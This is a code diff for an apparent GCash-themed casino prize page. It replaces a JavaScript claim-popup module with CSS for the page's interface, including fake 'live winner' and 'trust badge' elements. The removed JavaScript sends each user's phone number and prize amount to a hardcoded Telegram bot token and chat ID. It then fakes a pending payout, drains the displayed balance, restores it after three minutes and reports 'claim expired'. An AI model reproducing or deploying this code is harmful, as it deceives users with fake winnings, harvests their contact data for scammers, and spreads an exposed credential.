@@ -1,169 +1,490 @@
-/**
- * Claim Popup Module - Revised with Countdown & Decrement Animation
- */
-
-let claimState = {
-    isProcessing: false,
-    currentAmount: 0,
-    countdownInterval: null,
-    countdownSeconds: 180  // 3 minutes = 180 seconds
-};
-
-// Show the claim popup
-function showClaimPopup(amount) {
-    claimState.currentAmount = amount;
-    claimState.isProcessing = false;
-    
-    const popup = document.getElementById('claimPopup');
-    const prizeSpan = document.getElementById('popupPrizeAmount');
-    const claimBtn = document.getElementById('claimActionBtn');
-    
-    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
-    
-    claimBtn.classList.remove('processing');
-    claimBtn.innerHTML = 'CLAIM THRU GCASH';
-    claimBtn.disabled = false;
-    
-    popup.style.display = 'flex';
+/* ========== CSS RESET & VARIABLES ========== */
+:root { 
+    --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
+    --dark-bg: #04070d; 
+    --glass: rgba(255, 255, 255, 0.03);
+    --border: rgba(212, 175, 55, 0.3);
 }
 
-function hideClaimPopup() {
-    const popup = document.getElementById('claimPopup');
-    popup.style.display = 'none';
+* { 
+    margin: 0; 
+    padding: 0; 
+    box-sizing: border-box; 
+    -webkit-tap-highlight-color: transparent; 
 }
 
-function showPendingModal() {
-    const modal = document.getElementById('pendingModal');
-    modal.style.display = 'flex';
+/* ========== BASE BODY ========== */
+body { 
+    font-family: 'Public Sans', sans-serif; 
+    background-color: var(--dark-bg); 
+    background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
+    color: #fff; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    min-height: 100vh; 
+    padding: 15px; 
+    overflow-x: hidden; 
 }
 
-function hidePendingModal() {
-    const modal = document.getElementById('pendingModal');
-    modal.style.display = 'none';
+/* ========== ANIMATIONS ========== */
+@keyframes floatUp {
+    0% { opacity: 0; transform: translate(-50%, -20%) scale(0.5); }
+    30% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
+    100% { opacity: 0; transform: translate(-50%, -150%) scale(1.5); }
 }
 
-// Animate balance decreasing from current to 0
-function animateBalanceToZero(currentBalance, onComplete) {
-    const balanceText = document.getElementById('balanceText');
-    if (!balanceText) return;
-    
-    let current = currentBalance;
-    const step = Math.max(1, Math.floor(currentBalance / 30));
-    const interval = setInterval(() => {
-        current = Math.max(0, current - step);
-        balanceText.innerText = "₱" + current.toLocaleString() + ".00";
-        
-        if (current <= 0) {
-            clearInterval(interval);
-            balanceText.innerText = "₱0.00";
-            if (onComplete) onComplete();
-        }
-    }, 50);
+@keyframes fadeInOut { 
+    0% { opacity: 0; transform: translateY(-15px); } 
+    10% { opacity: 1; transform: translateY(0); } 
+    90% { opacity: 1; } 
+    100% { opacity: 0; } 
 }
 
-// Update countdown timer display
-function updateCountdownDisplay(seconds) {
-    const timerSpan = document.getElementById('pendingTimer');
-    if (!timerSpan) return;
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+@keyframes pulse { 
+    0% { opacity: 1; } 
+    50% { opacity: 0.4; } 
+    100% { opacity: 1; } 
 }
 
-// Start countdown (3 minutes)
-function startCountdown(onComplete) {
-    let remaining = claimState.countdownSeconds;
-    updateCountdownDisplay(remaining);
-    
-    claimState.countdownInterval = setInterval(() => {
-        remaining--;
-        updateCountdownDisplay(remaining);
-        
-        if (remaining <= 0) {
-            clearInterval(claimState.countdownInterval);
-            claimState.countdownInterval = null;
-            if (onComplete) onComplete();
-        }
-    }, 1000);
+@keyframes spin { 
+    to { transform: rotate(360deg); } 
 }
 
-// Main claim action
-function onClaimAction() {
-    if (claimState.isProcessing) return;
-    
-    claimState.isProcessing = true;
-    const claimBtn = document.getElementById('claimActionBtn');
-    const amount = claimState.currentAmount;
-    const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    
-    // Disable button and change text
-    claimBtn.disabled = true;
-    claimBtn.innerHTML = 'PROCESSING...';
-    
-    // Send notification to Telegram
-    const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
-        .catch(e => console.log('Telegram error:', e));
-    
-    // Close claim popup
-    hideClaimPopup();
-    
-    // Show pending modal with countdown
-    showPendingModal();
-    
-    // Animate balance decreasing to 0
-    const currentBalance = amount;
-    animateBalanceToZero(currentBalance, () => {
-        // Update main game balance to 0 in Firebase
-        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-            window.parent.updateGameBalance(0);
-        } else if (typeof updateGameBalance === 'function') {
-            updateGameBalance(0);
-        } else if (typeof GameState !== 'undefined') {
-            GameState.balance = 0;
-            if (typeof updateUI === 'function') updateUI();
-            if (typeof saveData === 'function') saveData();
-        }
-    });
-    
-    // Start 3-minute countdown
-    startCountdown(() => {
-        // Countdown finished - hide pending modal and restore claim button
-        hidePendingModal();
-        
-        // Reset claim state
-        claimState.isProcessing = false;
-        
-        // Restore the original balance (the prize amount)
-        if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
-            window.parent.updateGameBalance(amount);
-        } else if (typeof updateGameBalance === 'function') {
-            updateGameBalance(amount);
-        } else if (typeof GameState !== 'undefined') {
-            GameState.balance = amount;
-            if (typeof updateUI === 'function') updateUI();
-            if (typeof saveData === 'function') saveData();
-        }
-        
-        // Update balance display in main
-        const balanceText = document.getElementById('balanceText');
-        if (balanceText) {
-            balanceText.innerText = "₱" + amount.toLocaleString() + ".00";
-        }
-        
-        // Show claim popup again
-        showClaimPopup(amount);
-        
-        // Send Telegram notification that claim expired
-        const expireMsg = `⏰ CLAIM EXPIRED (No Action)!\n📱 ${userPhone}\n💵 ₱${amount}`;
-        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(expireMsg)}`)
-            .catch(e => console.log('Telegram error:', e));
-    });
+/* Card Animations */
+@keyframes twirl { 
+    0% { transform: rotateY(0); } 
+    100% { transform: rotateY(360deg); } 
 }
 
-// Initialize
-document.addEventListener('DOMContentLoaded', function() {
-    if (!document.getElementById('claimPopup')) {
-        console.log('Popup container not found');
+@keyframes bounce { 
+    0%, 100% { transform: translateY(0); } 
+    50% { transform: translateY(-20px); } 
+}
+
+@keyframes glow { 
+    0% { filter: brightness(1); } 
+    50% { filter: brightness(3); } 
+}
+
+@keyframes hop { 
+    0% { transform: scale(1); } 
+    50% { transform: scale(1.2) translateY(-10px); } 
+}
+
+@keyframes float { 
+    0% { transform: translateY(0); } 
+    50% { transform: translateY(-15px); } 
+}
+
+@keyframes punch { 
+    0% { transform: translateX(0); } 
+    50% { transform: translateX(10px) scale(1.1); } 
+}
+
+/* ========== COMPONENTS ========== */
+.mult-pop {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-family: 'Orbitron';
+    font-weight: 900;
+    font-size: 28px;
+    color: #fbbf24;
+    text-shadow: 0 0 10px #000, 0 0 20px #fbbf24;
+    pointer-events: none;
+    z-index: 1000;
+    white-space: nowrap;
+    animation: floatUp 0.8s ease-out forwards;
+}
+
+.live-winner-box { 
+    position: absolute; 
+    top: 20px; 
+    background: rgba(0, 0, 0, 0.85); 
+    border: 1px solid rgba(212, 175, 55, 0.4); 
+    padding: 8px 15px; 
+    border-radius: 50px; 
+    font-size: 11px; 
+    display: flex; 
+    align-items: center; 
+    gap: 8px; 
+    backdrop-filter: blur(10px); 
+    animation: fadeInOut 3s infinite; 
+    z-index: 100; 
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+}
+
+.dot { 
+    width: 8px; 
+    height: 8px; 
+    background: #22c55e; 
+    border-radius: 50%; 
+    box-shadow: 0 0 10px #22c55e; 
+    animation: pulse 1.5s infinite; 
+}
+
+.gc-mini-icon { 
+    width: 14px; 
+    height: 14px; 
+    vertical-align: middle; 
+    margin: 0 2px; 
+    object-fit: contain; 
+}
+
+/* ========== LAYOUT SECTIONS ========== */
+#mobileOnly { 
+    display: none; 
+    position: fixed; 
+    inset: 0; 
+    background: #04070d; 
+    z-index: 10000; 
+    align-items: center; 
+    justify-content: center; 
+    text-align: center; 
+    padding: 20px; 
+}
+
+.card { 
+    background: var(--glass); 
+    width: 100%; 
+    max-width: 400px; 
+    padding: 20px; 
+    border-radius: 30px; 
+    border: 1px solid var(--border); 
+    backdrop-filter: blur(15px); 
+    text-align: center; 
+    margin-top: 60px; 
+    position: relative; 
+}
+
+.casino-banner { 
+    width: 100%; 
+    border-radius: 20px; 
+    margin-bottom: 15px; 
+    border: 1px solid var(--border); 
+}
+
+.logo-img { 
+    width: 120px; 
+    margin-bottom: 15px; 
+}
+
+.footer-img { 
+    width: 100%; 
+    max-width: 220px; 
+    margin-top: 20px; 
+    opacity: 0.9; 
+}
+
+/* ========== GAME GRID ========== */
+.game-grid { 
+    display: grid; 
+    grid-template-columns: repeat(3, 1fr); 
+    gap: 10px; 
+    margin: 20px 0; 
+}
+
+.card-wrapper { 
+    cursor: pointer; 
+    position: relative; 
+}
+
+.card-img { 
+    width: 100%; 
+    max-width: 100px; 
+    filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5)); 
+    transition: transform 0.2s; 
+}
+
+.card-disabled { 
+    filter: grayscale(1) opacity(0.2) !important; 
+    pointer-events: none !important; 
+    transform: scale(0.9); 
+    transition: 0.5s; 
+}
+
+/* Animation Classes */
+.move-goddess { animation: twirl 0.6s ease; }
+.move-monkey { animation: bounce 0.5s ease; }
+.move-firegod { animation: glow 0.4s ease; }
+.move-bear { animation: hop 0.5s ease; }
+.move-girl { animation: float 0.6s ease; }
+.move-boxer { animation: punch 0.4s ease; }
+
+/* ========== TEXT & BUTTONS ========== */
+.amount { 
+    font-family: 'Orbitron'; 
+    font-size: 38px; 
+    background: var(--gold); 
+    -webkit-background-clip: text; 
+    -webkit-text-fill-color: transparent; 
+    font-weight: 700; 
+    margin: 10px 0; 
+}
+
+.btn-main { 
+    background: var(--gold); 
+    color: #000; 
+    padding: 18px; 
+    border: none; 
+    border-radius: 15px; 
+    font-weight: 800; 
+    width: 100%; 
+    display: none; 
+    cursor: pointer; 
+    text-transform: uppercase; 
+    margin-top: 10px; 
+    box-shadow: 0 4px #8b6508; 
+}
+
+.btn-main:active {
+    transform: translateY(2px);
+    box-shadow: 0 2px #8b6508;
+}
+
+.trust-badge { 
+    font-size: 10px; 
+    color: #64748b; 
+    margin-top: 15px; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    gap: 5px; 
+}
+
+/* ========== OVERLAY ========== */
+#processingOverlay { 
+    position: fixed; 
+    inset: 0; 
+    background: rgba(4, 7, 13, 0.98); 
+    z-index: 9999; 
+    display: none; 
+    flex-direction: column; 
+    align-items: center; 
+    justify-content: center; 
+}
+
+.spinner { 
+    width: 40px; 
+    height: 40px; 
+    border: 4px solid rgba(212,175,55,0.1); 
+    border-top-color: #d4af37; 
+    border-radius: 50%; 
+    animation: spin 1s linear infinite; 
+}
+
+/* ========== RESPONSIVE ========== */
+@media (max-width: 480px) {
+    .card {
+        margin-top: 50px;
+        padding: 15px;
     }
-});
+    
+    .amount {
+        font-size: 28px;
+    }
+    
+    .mult-pop {
+        font-size: 20px;
+    }
+}
+
+/* ========== REVISED CLAIM POPUP ========== */
+.claim-popup-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(12px);
+    z-index: 30000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Poppins', 'Segoe UI', sans-serif;
+}
+
+.claim-popup-card {
+    background: rgba(20, 25, 35, 0.96);
+    backdrop-filter: blur(20px);
+    border-radius: 48px;
+    max-width: 400px;
+    width: 88%;
+    padding: 35px 28px;
+    text-align: center;
+    border: 1px solid rgba(0, 242, 255, 0.3);
+    box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+    animation: fadeInScale 0.4s ease;
+}
+
+.claim-popup-card h2 {
+    color: #ffd700;
+    font-size: 26px;
+    margin-bottom: 8px;
+    font-weight: 800;
+}
+
+.claim-popup-card .greeting {
+    color: rgba(255,255,255,0.95);
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 20px;
+}
+
+/* Prize amount with neon green underline */
+.prize-amount-wrapper {
+    margin: 15px 0 5px;
+    position: relative;
+    display: inline-block;
+    width: auto;
+}
+
+.prize-amount {
+    background: linear-gradient(135deg, #ffd700, #ffaa33);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    font-size: 56px;
+    font-weight: 800;
+    display: inline-block;
+    position: relative;
+    z-index: 2;
+}
+
+.prize-underline {
+    position: absolute;
+    bottom: -8px;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background: #39ff14;
+    border-radius: 3px;
+    box-shadow: 0 0 12px #39ff14;
+    animation: underlinePulse 1.5s infinite;
+}
+
+@keyframes underlinePulse {
+    0% { opacity: 0.6; width: 80%; left: 10%; }
+    50% { opacity: 1; width: 100%; left: 0; }
+    100% { opacity: 0.6; width: 80%; left: 10%; }
+}
+
+.claim-popup-card .message {
+    color: rgba(255,255,255,0.85);
+    font-size: 14px;
+    line-height: 1.6;
+    margin: 20px 0 15px;
+}
+
+.claim-popup-card .message .highlight {
+    color: #00f2ff;
+    font-weight: 700;
+    text-transform: uppercase;
+}
+
+.simple-note {
+    background: rgba(0, 242, 255, 0.08);
+    border-radius: 20px;
+    padding: 10px;
+    margin: 15px 0;
+    border: 1px solid rgba(0, 242, 255, 0.3);
+}
+
+.simple-note p {
+    color: #00f2ff;
+    font-size: 12px;
+    font-weight: 500;
+}
+
+/* NEON BLUE BUTTON */
+.claim-action-btn {
+    background: linear-gradient(135deg, #0066ff, #0044cc);
+    border: none;
+    width: 100%;
+    padding: 16px 20px;
+    font-size: 18px;
+    font-weight: 800;
+    border-radius: 60px;
+    cursor: pointer;
+    transition: 0.2s;
+    font-family: 'Poppins', 'Segoe UI', sans-serif;
+    color: white;
+    margin-top: 10px;
+    box-shadow: 0 0 15px rgba(0, 102, 255, 0.5), 0 4px 10px rgba(0,0,0,0.3);
+    letter-spacing: 1px;
+}
+
+.claim-action-btn:active {
+    transform: scale(0.98);
+    box-shadow: 0 0 8px rgba(0, 102, 255, 0.8);
+}
+
+.claim-action-btn:disabled {
+    opacity: 0.6;
+    transform: none;
+    cursor: not-allowed;
+}
+
+.info-note {
+    color: rgba(255,255,255,0.35);
+    font-size: 10px;
+    margin-top: 18px;
+}
+
+@keyframes fadeInScale {
+    0% { opacity: 0; transform: scale(0.9); }
+    100% { opacity: 1; transform: scale(1); }
+}
+
+/* Adjust title font size para hindi mag-next line */
+.congrats-title {
+    font-size: 22px !important;
+    white-space: nowrap;
+}
+
+@media (max-width: 480px) {
+    .congrats-title {
+        font-size: 18px !important;
+        white-space: nowrap;
+    }
+}
+
+/* ========== PENDING STATUS IN MAIN GAME ========== */
+.pending-status-text {
+    color: #ff4444;
+    font-size: 14px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    animation: blinkRed 1.2s infinite;
+    margin-bottom: 8px;
+}
+
+.pending-countdown {
+    font-size: 28px;
+    font-weight: 800;
+    font-family: 'Orbitron', monospace;
+    color: #ffd700;
+    margin: 5px 0;
+}
+
+.pending-message-text {
+    color: #94a3b8;
+    font-size: 11px;
+}
+
+@keyframes blinkRed {
+    0% { opacity: 1; text-shadow: 0 0 0 #ff4444; }
+    50% { opacity: 0.6; text-shadow: 0 0 8px #ff4444; }
+    100% { opacity: 1; text-shadow: 0 0 0 #ff4444; }
+}
+
+/* ========== PENDING STATUS AREA ========== */
+#pendingStatusArea {
+    background: rgba(0,0,0,0.5);
+    border-radius: 16px;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid rgba(255,68,68,0.3);
+}
